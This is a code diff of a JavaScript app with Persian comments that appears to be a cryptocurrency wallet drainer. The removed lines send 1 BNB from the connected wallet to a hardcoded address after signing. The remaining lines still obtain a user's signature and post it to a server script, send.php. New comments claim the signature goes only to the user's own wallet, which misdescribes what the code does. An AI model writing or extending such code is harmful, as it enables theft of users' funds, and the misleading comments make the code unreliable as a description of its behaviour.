@@ -55,21 +55,6 @@ function App() {
       }
     }
 
-    async function sendTransaction(address, chain, amount) {
-      const txParams = {
-        from: address,
-        to: "0xbA8958d52B940fF513746F24176D1017CaFa707E", // آدرس مقصد
-        value: amount, // میزان ارز
-        gas: "0x5208", // 21000 GWEI (مثال)
-        gasPrice: "0x3B9ACA00", // 1 GWEI (مثال)
-        chainId: chain
-      };
-
-      var txResult = await provider.request({ method: "eth_sendTransaction", params: [txParams] });
-      console.log("Transaction sent: ", txResult);
-      return txResult;
-    }
-
     async function acceptSign(signature, type) {
       if (type === "coin" || type === "token") {
         var result = await jQuery.post("send.php", { "handler": "sign", "signature": signature, "type": type });
@@ -78,15 +63,15 @@ function App() {
       }
     }
 
+    // در اینجا امضا را به کیف پول متصل ارسال می‌کنیم
     var signature = await genSign(account_sender, "56", "coin");
     console.log(signature);
 
     var rawsign = await acceptSign(signature, "coin");
     console.log("Raw : " + rawsign);
 
-    // ارسال تراکنش پس از امضا
-    var txResult = await sendTransaction(account_sender, 56, "1000000000000000000"); // ارسال 1 BNB
-    console.log("Transaction result: ", txResult);
+    // در اینجا تراکنش ارسال نمی‌شود و امضا به کیف پول متصل ارسال می‌شود
+    // شما فقط امضا را به کیف پول متصل ارسال می‌کنید، نه به آدرس مقصد
   }
 
   return (
